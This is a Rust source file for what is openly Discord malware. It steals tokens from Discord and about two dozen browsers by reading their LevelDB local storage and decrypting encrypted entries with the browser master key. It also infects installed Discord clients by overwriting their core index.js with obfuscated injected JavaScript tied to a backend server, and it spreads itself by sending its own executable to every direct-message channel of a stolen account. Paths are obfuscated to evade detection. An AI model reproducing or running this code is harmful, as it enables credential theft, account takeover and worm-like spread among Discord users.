use crate::{crypto, utils};
use reqwest::blocking::multipart;
use rusty_leveldb::{Options, DB};
use serde_json::Value;
use std::ffi::CString;
use std::path::{Path, PathBuf};
use std::{env, fs};
use sysinfo::{ProcessExt, SystemExt};
use uuid::Uuid;
use walkdir::WalkDir;
use winapi::um::shellapi::ShellExecuteA;
use winapi::um::winuser::SW_HIDE;

// Discord clients to infect
const CLIENT_TARGETS: &[(&'static str, &'static str, &'static str)] = &[
    ("Local\\Discord", "Discord.exe", "Discord.lnk"),
    (
        "Local\\DiscordCanary",
        "DiscordCanary.exe",
        "DiscordCanary.lnk",
    ),
    ("Local\\DiscordPTB", "DiscordPTB.exe", "DiscordPTB.lnk"),
    (
        "Local\\DiscordDevelopment",
        "DiscordDevelopment.exe",
        "Discord Development.lnk",
    ),
];

// Code to inject to discord (obfuscated with https://www.preemptive.com/products/jsdefender/online-javascript-obfuscator-demo/)
const INJECT_CODE: &'static str = include_str!("../res/inject.js");

fn get_token_targets() -> Vec<String> {
    let mut targets = Vec::new();
    targets.push(obfstr::obfstr!("Roaming\\discord").to_string());
    targets.push(obfstr::obfstr!("Roaming\\discordcanary").to_string());
    targets.push(obfstr::obfstr!("Roaming\\discordptb").to_string());
    targets.push(obfstr::obfstr!("Roaming\\discorddevelopement").to_string());
    targets.push(obfstr::obfstr!("Roaming\\Opera Software\\Opera Stable").to_string());
    targets.push(obfstr::obfstr!("Local\\Google\\Chrome\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Google(x86)\\Chrome\\User Data\\Default").to_string());
    targets.push(
        obfstr::obfstr!("Local\\BraveSoftware\\Brave-Browser\\User Data\\Default").to_string(),
    );
    targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Chromunium\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Epic Privacy Browser\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Amigo\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Vivaldi\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Orbitum\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Mail.Ru\\Atom\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Kometa\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Comodo\\Dragon\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Torch\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Comodo\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Slimjet\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\360Browser\\Browser\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Maxthon3\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\K-Melon\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Sputnik\\Sputnik\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Nichrome\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\CocCoc\\Browser\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\uCozMedia\\Uran\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Chromodo\\User Data\\Default").to_string());
    targets.push(obfstr::obfstr!("Local\\Yandex\\YandexBrowser\\User Data\\Default").to_string());

    targets
}

fn infect_client(
    client_dir: &PathBuf,
    client_executable: &'static str,
    shortcut_name: &'static str,
    backend: &'static str,
) {
    for entry in WalkDir::new(client_dir).follow_links(true) {
        let entry = entry.unwrap();

        if entry.file_type().is_dir() {
            if entry
                .path()
                .to_string_lossy()
                .ends_with("discord_desktop_core")
            {
                fs::write(entry.path().join("index.js"), INJECT_CODE).unwrap();

                let options_path = entry.path().join("package.json");

                let contents = fs::read_to_string(&options_path).unwrap();

                let mut config: Value = serde_json::from_str(&contents).unwrap();
                config["backend"] = Value::String(backend.to_string());
                config["first_time"] = Value::Bool(true);
                fs::write(&options_path, config.to_string()).unwrap();
            }
        }
    }

    let mut system = sysinfo::System::new();
    system.refresh_all();

    let roaming = env::var("APPDATA").unwrap();
    let roaming_path = Path::new(roaming.as_str());

    if system.processes_by_name(client_executable).count() > 0 {
        for process in system.processes_by_name(client_executable) {
            process.kill();
        }

        let shortcut_dir = roaming_path.join(obfstr::obfstr!(
            "Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"
        ));
        let shortcut_path = shortcut_dir.join(shortcut_name);

        if shortcut_path.exists() {
            let lp_file = CString::new(shortcut_path.to_str().unwrap()).unwrap();

            unsafe {
                ShellExecuteA(
                    std::ptr::null_mut(),
                    std::ptr::null(),
                    lp_file.as_ptr(),
                    std::ptr::null(),
                    std::ptr::null(),
                    SW_HIDE,
                );
            }
        }
    }
}

pub fn auto_spread(token: &String, message: &String) {
    let client = reqwest::blocking::Client::new();

    let channels_request = client
        .get("https://discord.com/api/users/@me/channels")
        .header("Authorization", token)
        .send();

    let channels_response = match channels_request {
        Ok(relationships_response) => relationships_response,
        Err(_) => return,
    };

    let channels: Value = match serde_json::from_str(&channels_response.text().unwrap()) {
        Ok(channels) => channels,
        Err(_) => return,
    };

    let executable_path = env::current_exe().unwrap();
    let file_name = executable_path.file_stem().unwrap().to_str().unwrap();

    for channel in channels.as_array().unwrap() {
        let form = multipart::Form::new()
            .text("content", message.clone())
            .file(file_name.to_owned(), &executable_path)
            .unwrap();

        client
            .post(format!(
                "https://discord.com/channels/{}/messages",
                channel["id"]
            ))
            .header("Authorization", token)
            .multipart(form)
            .send()
            .unwrap();
    }
}

pub fn infect_clients(backend: &'static str) {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");

    for (path, client_executable, shortcut_name) in CLIENT_TARGETS.iter() {
        let client_dir = appdata_dir.join(path);

        if client_dir.exists() {
            infect_client(&client_dir, client_executable, shortcut_name, backend);
        }
    }
}

fn decrypt_token(ciphertext: &str, local_state_path: &PathBuf) -> Option<String> {
    if let Some(master_key) = crypto::get_master_key(&local_state_path) {
        let plaintext = crypto::aes_decrypt(base64::decode(ciphertext).ok()?, &master_key);
        return Some(String::from_utf8(plaintext).ok()?);
    }
    return None;
}

pub fn get_tokens() -> Vec<String> {
    let userprofile_env = env::var("USERPROFILE").unwrap();
    let appdata_dir = Path::new(userprofile_env.as_str()).join("AppData");
    let temp_env = std::env::temp_dir();

    let mut tokens = Vec::new();

    for token_target in get_token_targets() {
        let token_dir = appdata_dir.join(token_target);

        if !token_dir.exists() {
            continue;
        }

        let leveldb_dir = token_dir.join("Local Storage").join("leveldb");

        if !leveldb_dir.exists() {
            continue;
        }

        let temp_dir = temp_env.join(Uuid::new_v4().to_string());

        if utils::copy_directory(&leveldb_dir, &temp_dir).is_err() {
            continue;
        }

        let options = Options::default();
        let mut database = match DB::open(&temp_dir, options) {
            Ok(database) => database,
            Err(_) => {
                continue;
            }
        };

        // _https://discord.com☺tokens
        let key = [
            95, 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111,
            109, 0, 1, 116, 111, 107, 101, 110, 115,
        ];

        let bytes = match database.get(&key) {
            Some(bytes) => bytes,
            None => continue,
        };

        let json: Value = serde_json::from_slice(&bytes[1..]).unwrap();

        if let Some(obj) = json.as_object() {
            for value in obj.values() {
                let token = match value.as_str() {
                    Some(token) => token,
                    None => continue,
                };

                if token.starts_with("dQw4w9WgXcQ:") {
                    let local_state_path = token_dir.join("Local State");

                    if let Some(plaintext) = decrypt_token(&token[12..], &local_state_path) {
                        tokens.push(plaintext);
                    }
                } else {
                    tokens.push(token.to_string());
                }
            }
        }

        drop(database);
        fs::remove_dir_all(temp_dir).unwrap();
    }

    tokens
}
